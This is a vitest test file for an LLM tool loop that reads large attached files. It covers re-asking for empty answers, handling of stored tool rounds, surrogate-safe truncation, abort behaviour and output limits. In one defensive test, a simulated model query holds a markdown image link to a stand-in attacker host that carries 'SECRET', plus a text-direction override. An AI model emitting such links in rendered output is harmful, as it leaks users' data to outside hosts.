// The tool loop since the 0.6 review: the answer's request asked for once more, pointers that
// say only what is true, rounds of earlier questions sent as they should be, a question that stops
// when it is stopped, and steps that are plain text.
import { describe, expect, it } from "vitest";
import {
  askWithFiles,
  createLargeFiles,
  FINAL_ANSWER_REQUEST,
  MemoryDocumentStore,
  ModelRequestError,
  partialResultOf,
  type ChatMessage,
  type ModelMessage,
  type ModelToolRound,
  type RetryOptions,
  type ToolTurn,
} from "llm-large-files";
import { anthropic, anthropicToolTurns } from "llm-large-files/anthropic";
import { geminiToolTurns } from "llm-large-files/gemini";
import { openAiToolTurns } from "llm-large-files/openai";
import { readArguments } from "../src/http.js";
import { completeWithinLimit, THINKING_OUTPUT_TOKENS, type LimitedReply } from "../src/output-limit.js";
import { stepLine } from "../src/tools.js";
import { calls, fakeModel, says, serviceLog, utf8 } from "./fake-model.js";

const question = (text: string) => [{ role: "user" as const, text }];
const roundsOf = (messages: ModelMessage[]) => messages.filter((message): message is ModelToolRound => message.role === "tools");
const answersOf = (messages: ModelMessage[]) => roundsOf(messages).flatMap((round) => round.answers.map((answer) => answer.result));
const textOf = (message: ModelMessage | undefined) => (message && message.role !== "tools" ? message.parts.map((part) => part.text ?? "").join("\n") : "");
const quick = (): RetryOptions => ({ random: () => 1, sleep: async () => undefined });
/** Half of a character outside the basic plane, on its own. */
const LONE_SURROGATE = /[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/;
const ANSWER_AGAIN = "Your last reply had no text. No tool can be called in this reply: write the answer now, in text, from what is above.";

async function largeLog(lines = 5_000) {
  const store = new MemoryDocumentStore();
  const files = createLargeFiles({ store, budget: { inlineTokens: 1_000 } });
  const meta = await files.ingest({ name: "app.log", bytes: utf8(serviceLog(lines)) });
  return { files, meta, store };
}

describe("the answer's request, when its reply has no text", () => {
  const search = (id: string, query: string) => ({ name: "search_document", args: { document_id: id, query, mode: "exact" } });

  it("is asked for once more, with a note that is not kept, when the reply was empty", async () => {
    const { files, meta } = await largeLog();
    let answers = 0;
    const model = fakeModel([(request, n) => (request.toolChoice !== "none"
      ? calls([search(meta.id, `ERROR ${n}`)])
      : ++answers === 1 ? says("", { finish: "complete", finishReason: "STOP" }) : says("51 errors (app.log L97)."))]);
    const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: question("How many errors?"), retry: quick(), limits: { toolTurns: 3 } });
    expect(model.requests.map((request) => request.toolChoice)).toEqual(["auto", "auto", "none", "none"]);
    expect(textOf(model.requests[2]!.messages.at(-1))).toBe(FINAL_ANSWER_REQUEST);
    expect(textOf(model.requests[3]!.messages.at(-1))).toBe(`${FINAL_ANSWER_REQUEST}\n${ANSWER_AGAIN}`);
    // The rest of the request is the one the first try had.
    expect(model.requests[3]!.messages.slice(0, -1)).toEqual(model.requests[2]!.messages.slice(0, -1));
    expect(result).toMatchObject({ text: "51 errors (app.log L97).", answered: true, usage: { requests: 4 } });
    expect(result.steps.at(-1)).toBe("The model's answer was empty: it was asked again");
  });

  it("is asked for once more when the model called a tool, or wrote a call that could not be read", async () => {
    const { files, meta } = await largeLog();
    for (const instead of [calls([search(meta.id, "WARN")]), says("", { finish: "malformed_call", finishReason: "UNEXPECTED_TOOL_CALL" })]) {
      let answers = 0;
      const model = fakeModel([(request, n) => (request.toolChoice !== "none"
        ? calls([search(meta.id, `ERROR ${n}`)])
        : ++answers === 1 ? instead : says("51 errors."))]);
      const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), limits: { toolTurns: 2 } });
      expect(model.requests.map((request) => request.toolChoice)).toEqual(["auto", "none", "none"]);
      expect(result).toMatchObject({ text: "51 errors.", answered: true });
      expect(result.steps.at(-1)).toBe("The model called a tool instead of answering: it was asked again for the answer");
      // The call it made instead was not run.
      expect(result.toolTurns).toHaveLength(1);
    }
  });

  it("is asked for once only: a model that never answers in text ends the question unanswered", async () => {
    const { files, meta } = await largeLog();
    const model = fakeModel([(_request, n) => calls([search(meta.id, `x${n}`)])]);
    const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), limits: { toolTurns: 3 } });
    expect(model.requests.map((request) => request.toolChoice)).toEqual(["auto", "auto", "none", "none"]);
    expect(result).toMatchObject({ text: "", answered: false });
  });

  it("is not asked for again after a refusal, a filter, a reply cut off with nothing in it, at a ceiling, or after two second tries", async () => {
    const { files, meta } = await largeLog();
    const answerRequests = async (last: ReturnType<typeof says>, more: { requests?: number; broken?: boolean } = {}) => {
      // Two calls that could not be read, each after a tool turn: each is asked for again.
      const turns = more.broken ? ["broken", "search", "broken", "search"] : [];
      const model = fakeModel([(request, n) => {
        if (request.toolChoice === "none") return last;
        return turns.shift() === "broken" ? says("", { finish: "malformed_call" }) : calls([search(meta.id, `ERROR ${n}`)]);
      }]);
      await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), limits: { toolTurns: 6, ...(more.requests ? { requests: more.requests } : {}) } });
      return model.requests.filter((request) => request.toolChoice === "none").length;
    };
    const empty = says("", { finish: "complete" });
    // The control: asked for again.
    expect(await answerRequests(empty)).toBe(2);
    expect(await answerRequests(says("", { blockReason: "refusal: cyber", finishReason: "refusal" }))).toBe(1);
    expect(await answerRequests(says("", { finish: "filtered", finishReason: "SAFETY" }))).toBe(1);
    expect(await answerRequests(says("", { finish: "cut", finishReason: "MAX_TOKENS" }))).toBe(1);
    // limits.requests 3: two tool turns, and the answer's request is the last one the question may make.
    expect(await answerRequests(empty, { requests: 3 })).toBe(1);
    // Two second tries were made already, for calls that could not be read.
    expect(await answerRequests(empty, { broken: true })).toBe(1);
  });
});

describe("a call made again, with a model whose provider clears old tool results", () => {
  const search = (id: string, query = "ERROR") => ({ name: "search_document", args: { document_id: id, query, mode: "exact" } });

  it("is run again, in a later turn and in the same turn: no pointer says the result is still shown", async () => {
    const { files, meta } = await largeLog();
    const model = fakeModel([calls([search(meta.id)]), calls([search(meta.id), search(meta.id)]), says("51 errors.")], { clearsToolResults: true });
    const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick() });
    const answers = answersOf(model.requests[2]!.messages);
    expect(answers).toHaveLength(3);
    for (const answer of answers) expect(answer).toMatchObject({ total_matching_lines: 51 });
    expect(answers.some((answer) => answer.already_shown === true)).toBe(false);
    expect(result.steps.every((line) => line.endsWith("51 matching lines"))).toBe(true);
  });

  it("makes a pointer kept from an earlier question a stand-in that says to call again", async () => {
    const { files, meta } = await largeLog();
    const tools = files.tools([meta]);
    const full = await tools.execute("search_document", search(meta.id).args);
    const stored: ChatMessage[] = [
      { role: "user", text: "Errors?" },
      { role: "tools", calls: [{ ...search(meta.id), result: full }] },
      { role: "tools", calls: [{ ...search(meta.id), result: { document: "app.log", already_shown: true, note: "Not run: this exact call was answered earlier in this conversation, and its result is still shown above in full." } }] },
      { role: "assistant", text: "51." },
      { role: "user", text: "And now?" },
    ];
    const clearing = fakeModel([says("Done.")], { clearsToolResults: true });
    await askWithFiles({ files, model: clearing, documentIds: [meta.id], messages: stored, retry: quick() });
    expect(answersOf(clearing.requests[0]!.messages)[1]).toMatchObject({ document: "app.log", dropped: true, note: expect.stringMatching(/^Not run then/) });
    // A model whose results stay keeps the pointer.
    const keeping = fakeModel([says("Done.")]);
    await askWithFiles({ files, model: keeping, documentIds: [meta.id], messages: stored, retry: quick() });
    expect(answersOf(keeping.requests[0]!.messages)[1]).toMatchObject({ already_shown: true });
  });

  it("is what the Claude adapter says when its body clears tool results or compacts the conversation", () => {
    const claude = (body?: Record<string, unknown>) => anthropic({ model: "claude-test", apiKey: "test-key", ...(body ? { body } : {}) }).capabilities.clearsToolResults;
    expect(claude({ context_management: { edits: [{ type: "clear_tool_uses_20250919", keep: { type: "tool_uses", value: 3 } }] } })).toBe(true);
    expect(claude({ context_management: { edits: [{ type: "compact_20260112" }] } })).toBe(true);
    expect(claude({ context_management: { edits: [{ type: "clear_thinking_20251015" }] } })).toBeUndefined();
    expect(claude({ output_config: { effort: "low" } })).toBeUndefined();
    expect(claude()).toBeUndefined();
  });
});

describe("a read in the rounds of an earlier question", () => {
  const read = (id: string, from: number, to: number) => ({ name: "read_document", args: { document_id: id, start_line: from, end_line: to } });

  it("of one line is run again: 0.5.0 cut a long line without saying so", async () => {
    const { files, meta } = await largeLog();
    // As 0.5.0 stored a read of one line cut to the room it had: no text_cut.
    const cut = { document: "app.log", lines: "1500-1500", total_lines: 5_000, text: "1500| 2026-11-12T08:06:15.000Z INFO [worker-4] req=", next_start_line: 1501, tool_turns_left: 3 };
    const whole = await files.tools([meta]).execute("read_document", read(meta.id, 100, 200).args);
    const stored: ChatMessage[] = [
      { role: "user", text: "Lines?" },
      { role: "tools", calls: [{ ...read(meta.id, 1500, 1500), result: cut }, { ...read(meta.id, 100, 200), result: whole }] },
      { role: "assistant", text: "Here." },
      { role: "user", text: "Again?" },
    ];
    const model = fakeModel([calls([read(meta.id, 1500, 1500), read(meta.id, 150, 160)]), says("Done.")]);
    const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: stored, retry: quick() });
    const [again, inside] = answersOf(model.requests[1]!.messages).slice(-2);
    expect(again).toMatchObject({ lines: "1500-1500", text: expect.stringMatching(/^1500\| .*took \d+ms$/) });
    expect(again!.already_shown).toBeUndefined();
    // A read of many lines was never cut that way: a read inside it is still pointed to.
    expect(inside).toMatchObject({ lines: "150-160", already_shown: true });
    expect(result.steps).toEqual(["Read app.log lines 1500-1500", "Read app.log lines 150-160 — already shown above"]);
  });

  it("of one line in this question is still pointed to: its text says when it was cut", async () => {
    const { files, meta } = await largeLog();
    const model = fakeModel([calls([read(meta.id, 50, 50)]), calls([read(meta.id, 50, 50)]), says("Done.")]);
    await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick() });
    expect(answersOf(model.requests[2]!.messages)[1]).toMatchObject({ lines: "50-50", already_shown: true });
  });

  it("of one line is no longer said to be shown in full by a pointer that main stored in a later question", async () => {
    const { files, meta } = await largeLog();
    const tools = files.tools([meta]);
    const cut = { document: "app.log", lines: "1500-1500", total_lines: 5_000, text: "1500| 2026-11-12T08:06:15.000Z INFO [worker-4] req=", next_start_line: 1501 };
    const pointer = (from: number, to: number, first: number, last: number) => ({
      document: "app.log",
      lines: `${from}-${to}`,
      already_shown: true,
      note: `Not run: lines ${from}-${to} are already shown above in full, in the result that has lines ${first}-${last} of this file, and the file has not changed. Use them. To see more, read other lines.`,
    });
    const stored: ChatMessage[] = [
      // Read by 0.5.0, which cut line 1500 without saying so; or by main: the rounds cannot tell.
      { role: "user", text: "Lines?" },
      { role: "tools", calls: [
        { ...read(meta.id, 1500, 1500), result: cut },
        { ...read(meta.id, 100, 200), result: await tools.execute("read_document", read(meta.id, 100, 200).args) },
        { ...read(meta.id, 50, 50), result: await tools.execute("read_document", read(meta.id, 50, 50).args) },
      ] },
      // A pointer of the same question: the read it points to was made by the same version.
      { role: "tools", calls: [{ ...read(meta.id, 50, 50), result: pointer(50, 50, 50, 50) }] },
      { role: "assistant", text: "Here." },
      // Pointers main made in a later question.
      { role: "user", text: "Again?" },
      { role: "tools", calls: [{ ...read(meta.id, 1500, 1500), result: pointer(1500, 1500, 1500, 1500) }, { ...read(meta.id, 150, 160), result: pointer(150, 160, 100, 200) }] },
      { role: "assistant", text: "Same." },
      { role: "user", text: "And now?" },
    ];
    const model = fakeModel([says("Done.")]);
    await askWithFiles({ files, model, documentIds: [meta.id], messages: stored, retry: quick() });
    const [, , , same, oneLine, inside] = answersOf(model.requests[0]!.messages);
    expect(oneLine).toEqual({ document: "app.log", dropped: true, note: "Not run then: it repeated an earlier call whose result was later dropped from the conversation to make room. Call it again if you need it." });
    // The pointer of the same question, and the one to a read of many lines, are sent as they were.
    expect(same).toEqual(pointer(50, 50, 50, 50));
    expect(inside).toEqual(pointer(150, 160, 100, 200));
  });
});

describe("the rounds of an earlier question", () => {
  it("are sent again without the tool turns their own question had left", async () => {
    const { files, meta } = await largeLog();
    const search = { name: "search_document", args: { document_id: meta.id, query: "ERROR", mode: "exact" } };
    const first = await askWithFiles({ files, model: fakeModel([calls([search]), says("51.")]), documentIds: [meta.id], messages: question("Errors?"), retry: quick(), limits: { toolTurns: 2 } });
    // Stored as the model had it: no turn was left.
    expect(first.toolTurns[0]!.calls[0]!.result).toMatchObject({ total_matching_lines: 51, tool_turns_left: 0 });
    const model = fakeModel([calls([{ name: "get_document_overview", args: { document_id: meta.id } }]), says("Done.")]);
    const next = await askWithFiles({
      files, model, documentIds: [meta.id], retry: quick(),
      messages: [{ role: "user", text: "Errors?" }, ...first.toolTurns, { role: "assistant", text: first.text }, { role: "user", text: "And the overview?" }],
    });
    const [stored, overview] = answersOf(model.requests[1]!.messages);
    expect(stored).toMatchObject({ total_matching_lines: 51 });
    expect(stored).not.toHaveProperty("tool_turns_left");
    expect(overview).toMatchObject({ document: "app.log", tool_turns_left: 10 });
    expect(next.toolTurns[0]!.calls[0]!.result).toMatchObject({ tool_turns_left: 10 });
    // The application's own copy is not changed.
    expect(first.toolTurns[0]!.calls[0]!.result.tool_turns_left).toBe(0);
  });

  it("are converted for a history in a provider's own form without them too", () => {
    const turns: ToolTurn[] = [{ role: "tools", calls: [{ id: "c1", name: "read_document", args: { document_id: "doc_1", start_line: 1, end_line: 2 }, result: { document: "app.log", lines: "1-2", total_lines: 9, text: "1| a\n2| b", tool_turns_left: 0 } }] }];
    for (const converted of [geminiToolTurns(turns), openAiToolTurns(turns), anthropicToolTurns(turns)]) {
      expect(JSON.stringify(converted)).toContain("1| a");
      expect(JSON.stringify(converted)).not.toContain("tool_turns_left");
    }
  });

  it("and the metadata 0.5.0 stored hold no half of a character when they are sent: Claude's API refuses one", async () => {
    const { meta, store } = await largeLog();
    // 0.5.0 cut log templates at 180 characters, and search windows, inside an emoji.
    const kept = (await store.get(meta.id))!;
    const issues = kept.meta.logProfile!.topIssues.map((issue, index) => (index === 0 ? { ...issue, template: `${issue.template.slice(0, 20)}\ud83d` } : issue));
    await store.put({ ...kept, meta: { ...kept.meta, logProfile: { ...kept.meta.logProfile!, topIssues: issues } } });
    const files = createLargeFiles({ store, budget: { inlineTokens: 1_000 } });
    const stored: ChatMessage[] = [
      { role: "user", text: "Where is the needle?" },
      { role: "tools", calls: [{ name: "search_document", args: { document_id: meta.id, query: "NEEDLE", mode: "exact" }, result: { document: "app.log", mode: "exact", total_matching_lines: 1, matches: [{ line: 1600, text: "…\ude00 NEEDLE \ud83d…" }] } }] },
      { role: "assistant", text: "Line 1600." },
      { role: "user", text: "And the errors?" },
    ];
    const bodies: string[] = [];
    const claude = anthropic({ model: "claude-test", apiKey: "test-key", stream: false, fetch: (async (_url: string | URL | Request, init?: RequestInit) => {
      bodies.push(String(init?.body));
      return Response.json(bodies.length === 1
        ? { id: "m1", type: "message", role: "assistant", content: [{ type: "tool_use", id: "t1", name: "get_document_overview", input: { document_id: meta.id } }], stop_reason: "tool_use", usage: { input_tokens: 100, output_tokens: 5 } }
        : { id: "m2", type: "message", role: "assistant", content: [{ type: "text", text: "Done." }], stop_reason: "end_turn", usage: { input_tokens: 100, output_tokens: 5 } });
    }) as typeof fetch });
    const result = await askWithFiles({ files, model: claude, documentIds: [meta.id], messages: stored, retry: quick() });
    expect(result.answered).toBe(true);
    // JSON writes half of a character as an escape of its own.
    for (const body of bodies) expect(body).not.toMatch(/\\ud[89a-f][0-9a-f]{2}/i);
    const sent = JSON.parse(bodies[1]!) as { messages: Array<{ content: Array<Record<string, any>> }> };
    const blocks = sent.messages.flatMap((message) => message.content);
    // The card, the stored window and the overview each have a replacement character where the half was.
    expect(blocks[0]!.text).toContain(`${kept.meta.logProfile!.topIssues[0]!.template.slice(0, 20)}\ufffd`);
    expect(JSON.stringify(blocks)).toContain("…\ufffd NEEDLE \ufffd…");
    const overview = JSON.parse(blocks.filter((block) => block.type === "tool_result").at(-1)!.content as string);
    expect(overview.log_profile.topIssues[0].template.endsWith("\ufffd")).toBe(true);
    // A document whose metadata is whole gives the card it gave.
    const fresh = await largeLog();
    const card = (await fresh.files.prepare([fresh.meta.id], { tokens: 0, bytes: 0 })).blocks.get(fresh.meta.id)!;
    expect(card).toContain(fresh.meta.logProfile!.topIssues[0]!.template);
  });

  it("and a file name 0.5.0 cut inside an emoji are sent with a replacement character for the half", async () => {
    const { files: first, meta, store } = await largeLog();
    const small = await first.ingest({ name: "notes.txt", bytes: utf8("hello\n") });
    // 0.5.0 cut names at 255 UTF-16 units, at times inside an emoji, and stored them so.
    const half = `${"a".repeat(254)}\ud83d`;
    const whole = `${"a".repeat(254)}\ufffd`;
    for (const id of [meta.id, small.id]) {
      const kept = (await store.get(id))!;
      await store.put({ ...kept, meta: { ...kept.meta, name: half } });
    }
    const files = createLargeFiles({ store, budget: { inlineTokens: 1_000 } });
    expect((await files.getMeta(meta.id))!.name).toBe(whole);
    const prepared = await files.prepare([meta.id, small.id], { tokens: 0, bytes: 0 });
    expect(prepared.blocks.get(meta.id)!.split("\n")[0]).toBe(`--- Large attached file: ${whole} ---`);
    expect(prepared.blocks.get(small.id)!.split("\n")[0]).toMatch(/^--- Attached file \[mark [0-9a-f]{8}\]: "a{254}\ufffd" \(text, 1 line;/);
    // The tool results and steps, with the metadata the application kept from the old ingest too.
    const tools = files.tools([{ ...meta, name: half }]);
    expect(tools.describe("search_document", { document_id: meta.id, query: "ERROR", mode: "exact" })).toBe(`Search ${whole} (exact) for “ERROR”`);
    expect((await tools.execute("search_document", { document_id: meta.id, query: "ERROR", mode: "exact" })).document).toBe(whole);
    const model = fakeModel([calls([{ name: "search_document", args: { document_id: meta.id, query: "ERROR", mode: "exact" } }]), says("Done.")]);
    const result = await askWithFiles({ files, model, documentIds: [meta.id, small.id], messages: question("?"), retry: quick() });
    // JSON writes half of a character as an escape of its own.
    expect(JSON.stringify(model.requests)).not.toMatch(/\\ud[89a-f][0-9a-f]{2}/i);
    expect(result.steps.join("\n")).not.toMatch(LONE_SURROGATE);
  });
});

describe("a call whose arguments could not be read", () => {
  it("quotes them in its problem without cutting a character in half", async () => {
    const { problem } = readArguments(`${"x".repeat(299)}\u{1F600}tail{`);
    expect(problem).toBe(`The arguments of this call were not a JSON object, and it was not run: ${"x".repeat(299)}. Send the call again.`);
    expect(problem).not.toMatch(LONE_SURROGATE);

    // A Claude call whose input JSON was cut, with an emoji where the quote ends.
    const partial = `{"query":"${"x".repeat(289)}\u{1F525}`;
    const events = [
      { type: "message_start", message: { usage: { input_tokens: 1 } } },
      { type: "content_block_start", index: 0, content_block: { type: "tool_use", id: "toolu_a", name: "search_document", input: {} } },
      { type: "content_block_delta", index: 0, delta: { type: "input_json_delta", partial_json: partial } },
      { type: "content_block_stop", index: 0 },
      { type: "message_delta", delta: { stop_reason: "tool_use" }, usage: { output_tokens: 1 } },
    ];
    const body = events.map((event) => `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`).join("");
    const claude = anthropic({ model: "claude-test", apiKey: "test-key", fetch: (async () => new Response(body, { status: 200, headers: { "Content-Type": "text/event-stream" } })) as typeof fetch });
    const reply = await claude.send({ system: "", messages: [{ role: "user", parts: [{ text: "hi" }] }] }, { onText: () => undefined });
    expect(reply.calls[0]!.problem).toBe(`The arguments of this call were not valid JSON, and it was not run: {"query":"${"x".repeat(289)}. Send the call again.`);
  });
});

describe("a question that is stopped", () => {
  const search = (id: string) => calls([{ name: "search_document", args: { document_id: id, query: "ERROR", mode: "exact" } }]);
  const settle = (question: Promise<unknown>) => Promise.race([
    question.then(() => "answered", (error: unknown) => error),
    new Promise((resolve) => setTimeout(() => resolve("still waiting"), 2_000)),
  ]);

  it("ends when its signal aborts, with what it found, even with an adapter that does not stop", async () => {
    const { files, meta } = await largeLog();
    // The second request never ends: this adapter does not look at the signal.
    const model = fakeModel([search(meta.id), () => new Promise<never>(() => undefined)]);
    const stop = new AbortController();
    setTimeout(() => stop.abort(new Error("The user stopped the question.")), 50);
    const outcome = await settle(askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), signal: stop.signal }));
    expect(outcome).toBeInstanceOf(Error);
    expect((outcome as Error).message).toBe("The user stopped the question.");
    expect(partialResultOf(outcome)).toMatchObject({ answered: false, steps: ["Search app.log (exact) for “ERROR” — 51 matching lines"], toolTurns: [{ role: "tools" }] });
  });

  it("shows no text that such an adapter sends after the stop", async () => {
    const { files, meta } = await largeLog();
    const model = fakeModel([search(meta.id), async (_request, _n, hooks) => {
      await new Promise((resolve) => setTimeout(resolve, 100));
      hooks.onText?.("Too late.");
      return says("Too late.");
    }]);
    const stop = new AbortController();
    setTimeout(() => stop.abort(new Error("stopped")), 30);
    const shown: string[] = [];
    await expect(askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), signal: stop.signal, onText: (delta) => shown.push(delta) })).rejects.toThrow("stopped");
    await new Promise((resolve) => setTimeout(resolve, 150));
    expect(shown).toEqual([]);
  });

  it("ends when the caller stops it from onText while the adapter is still being called, and the adapter does not stop", async () => {
    const { files, meta } = await largeLog();
    // The text comes before the adapter's first await: the caller's onText runs inside send().
    const model = fakeModel([search(meta.id), (_request, _n, hooks) => {
      hooks.onText?.("First words");
      return new Promise<never>(() => undefined);
    }]);
    const stop = new AbortController();
    const outcome = await settle(askWithFiles({
      files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), signal: stop.signal,
      onText: () => stop.abort(new Error("The user stopped the question.")),
    }));
    expect(outcome).toBeInstanceOf(Error);
    expect((outcome as Error).message).toBe("The user stopped the question.");
    expect(partialResultOf(outcome)).toMatchObject({ answered: false, text: "First words" });
  });

  it("is not answered when the caller stops it from onText and the adapter answers at once regardless", async () => {
    const { files, meta } = await largeLog();
    const model = fakeModel([search(meta.id), (_request, _n, hooks) => {
      hooks.onText?.("Half");
      return says("Half an answer.");
    }]);
    const stop = new AbortController();
    const outcome = await settle(askWithFiles({
      files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), signal: stop.signal,
      onText: () => stop.abort(new Error("The user stopped the question.")),
    }));
    expect((outcome as Error).message).toBe("The user stopped the question.");
    expect(partialResultOf(outcome)).toMatchObject({ answered: false, text: "Half" });
  });

  it("ends a whole-file read whose part reader does not stop", async () => {
    const { files, meta } = await largeLog();
    const model = fakeModel([calls([{ name: "analyze_whole_document", args: { document_id: meta.id, task: "List the errors." } }]), says("Done.")], {
      generateText: () => new Promise<string>(() => undefined),
    });
    const stop = new AbortController();
    setTimeout(() => stop.abort(new Error("The user stopped the question.")), 50);
    const outcome = await settle(askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), signal: stop.signal }));
    expect(outcome).toBeInstanceOf(Error);
    expect((outcome as Error).message).toBe("The user stopped the question.");
  });

  it("sends nothing more when it was stopped between two requests, even to an adapter that does not stop", async () => {
    const { files, meta } = await largeLog();
    const model = fakeModel([search(meta.id), () => new Promise<never>(() => undefined)]);
    const stop = new AbortController();
    // Stopped once the search ran, before the next request.
    const outcome = await settle(askWithFiles({
      files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), signal: stop.signal,
      onStep: () => stop.abort(new Error("The user stopped the question.")),
    }));
    expect(outcome).toBeInstanceOf(Error);
    expect((outcome as Error).message).toBe("The user stopped the question.");
    expect(model.requests).toHaveLength(1);
  });

  it("reads no more parts of a whole file once stopped, and its usage stays what it was at the stop", async () => {
    const { files, meta } = await largeLog();
    const stop = new AbortController();
    const abortedAtCall: boolean[] = [];
    let finish!: () => void;
    const late = new Promise<void>((resolve) => { finish = resolve; });
    // The first part stops the question, and its reader goes on: it reports its usage later.
    const model = fakeModel([calls([{ name: "analyze_whole_document", args: { document_id: meta.id, task: "List the errors." } }]), says("Done.")], {
      generateText: (part) => {
        abortedAtCall.push(part.signal?.aborted === true);
        stop.abort(new Error("The user stopped the question."));
        return late.then(() => {
          part.onUsage?.({ inputTokens: 1_000, outputTokens: 10 });
          return "Notes (L97).";
        });
      },
    });
    const outcome = await settle(askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), signal: stop.signal }));
    expect((outcome as Error).message).toBe("The user stopped the question.");
    // The other parts were read from the store while the first one was sent: none of them was sent.
    expect(abortedAtCall).toEqual([false]);
    const usage = structuredClone(partialResultOf(outcome)!.usage);
    expect(usage).toMatchObject({ requests: 1, inputTokens: 0 });
    finish();
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(partialResultOf(outcome)!.usage).toEqual(usage);
  });
});

describe("the larger output limit of a part read", () => {
  // What is learned about a model is kept by its key for the life of the process: each test has its own.
  let keys = 0;
  const freshKey = () => `https://test.invalid/v1/models/thinker-${++keys}`;
  const starved: LimitedReply = { text: "", cutOff: true, thoughts: 4_000, reason: "MAX_TOKENS" };
  const overflow = (limitTokens: number) => Object.assign(new Error(`input length and max_tokens exceed context limit: 190000 + 32768 > ${limitTokens}`), { status: 400, kind: "context_overflow", limitTokens });

  it("is given again after a request too large for the window with it: a smaller part may fit", async () => {
    const model = freshKey();
    const limits: number[] = [];
    await expect(completeWithinLimit(model, 4_096, async (limit) => {
      limits.push(limit);
      if (limit === THINKING_OUTPUT_TOKENS) throw overflow(200_000);
      return starved;
    })).rejects.toThrow(/exceed context limit/);
    // A later part, of another question.
    const notes = await completeWithinLimit(model, 4_096, async (limit) => {
      limits.push(limit);
      return limit === THINKING_OUTPUT_TOKENS ? { text: "Notes (L4).", cutOff: false, thoughts: 9_000 } : starved;
    });
    expect(notes).toBe("Notes (L4).");
    expect(limits).toEqual([4_096, THINKING_OUTPUT_TOKENS, 4_096, THINKING_OUTPUT_TOKENS]);
  });

  it("is not asked for again when the window is no larger than the limit, or the model refuses it", async () => {
    for (const refusal of [overflow(32_768), Object.assign(new Error("max_tokens: 32768 > 8192, which is the maximum allowed"), { status: 400, kind: "invalid" })]) {
      const model = freshKey();
      const limits: number[] = [];
      const send = async (limit: number) => {
        limits.push(limit);
        if (limit === THINKING_OUTPUT_TOKENS) throw refusal;
        return starved;
      };
      await expect(completeWithinLimit(model, 4_096, send)).rejects.toBe(refusal);
      await expect(completeWithinLimit(model, 4_096, send)).rejects.toThrow(/returned no text/);
      expect(limits).toEqual([4_096, THINKING_OUTPUT_TOKENS, 4_096]);
    }
  });

  it("is not asked for again when the provider's allowance a minute is no larger than it, and is given again when it is", async () => {
    // OpenAI's refusal of a request larger than the tokens a minute it allows: HTTP 429, not 400.
    const tpm = (limit: number) => new ModelRequestError(`Request too large for o3 in organization org-x on tokens per min (TPM): Limit ${limit}, Requested 45237. The input or output tokens must be reduced in order to run successfully.`, 429, { code: "rate_limit_exceeded" });
    // Groq's: HTTP 413.
    const groq = new ModelRequestError("Request too large for model `qwen/qwen3-32b` in organization `org_x` service tier `on_demand` on tokens per minute (TPM): Limit 30000, Requested 45237, please reduce your message size and try again.", 413, { code: "rate_limit_exceeded" });
    for (const refusal of [tpm(30_000), groq]) {
      expect(refusal).toMatchObject({ kind: "context_overflow", limitTokens: 30_000 });
      const model = freshKey();
      const limits: number[] = [];
      const send = async (limit: number) => {
        limits.push(limit);
        if (limit === THINKING_OUTPUT_TOKENS) throw refusal;
        return limits.length === 1 ? starved : { text: "Notes (L4).", cutOff: false, thoughts: 0 };
      };
      await expect(completeWithinLimit(model, 4_096, send)).rejects.toBe(refusal);
      // A later part is read with the smaller limit, not refused again.
      expect(await completeWithinLimit(model, 4_096, send)).toBe("Notes (L4).");
      expect(limits).toEqual([4_096, THINKING_OUTPUT_TOKENS, 4_096]);
    }
    // An allowance larger than the limit: forgotten, as for a window, so a smaller part may fit.
    const model = freshKey();
    const limits: number[] = [];
    const refusal = tpm(40_000);
    await expect(completeWithinLimit(model, 4_096, async (limit) => {
      limits.push(limit);
      if (limit === THINKING_OUTPUT_TOKENS) throw refusal;
      return starved;
    })).rejects.toBe(refusal);
    expect(await completeWithinLimit(model, 4_096, async (limit) => {
      limits.push(limit);
      return limit === THINKING_OUTPUT_TOKENS ? { text: "Notes (L4).", cutOff: false, thoughts: 9_000 } : starved;
    })).toBe("Notes (L4).");
    expect(limits).toEqual([4_096, THINKING_OUTPUT_TOKENS, 4_096, THINKING_OUTPUT_TOKENS]);
  });
});

describe("a step", () => {
  it("is one line of plain text, whatever the model sent: no line break, text-direction control or markdown link", async () => {
    const { files, meta } = await largeLog();
    const query = "x\n\n![img](https://attacker.example/c?d=SECRET)\u202egol.exe";
    const model = fakeModel([
      calls([
        { name: "search_document", args: { document_id: meta.id, query, mode: "exact" } },
        { name: "do\nmagic\u2066", args: {} },
        { name: "read_document", args: {}, problem: "The arguments of this call were not a JSON object, and it was not run: {\"a\":\n\"b. Send the call again." },
      ]),
      says("Done."),
    ]);
    const shown: string[] = [];
    const activity: string[] = [];
    const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), onStep: (line) => shown.push(line), onActivity: (line) => activity.push(line) });
    expect(result.steps).toEqual([
      "Search app.log (exact) for “x ![img] (https://attacker.example/c?d=SECRET)gol.exe” — 0 matching lines",
      "Call “do magic” — failed: Unknown tool “do magic”.",
      "Read the file lines 1 — failed: The arguments of this call were not a JSON object, and it was not run: {\"a\": \"b. Send the call again.",
    ]);
    expect(shown).toEqual(result.steps);
    expect(activity).toContain("Search app.log (exact) for “x ![img] (https://attacker.example/c?d=SECRET)gol.exe”…");
    // The model gets what the tools returned, as they returned it.
    expect(answersOf(model.requests[1]!.messages)[1]).toMatchObject({ error: "Unknown tool “do\nmagic\u2066”." });
  });

  it("quotes a long query or task without cutting a character in half", async () => {
    const { files, meta } = await largeLog();
    const tools = files.tools([meta]);
    // The 80th unit of the query, and the 100th of the task, are the first half of an emoji.
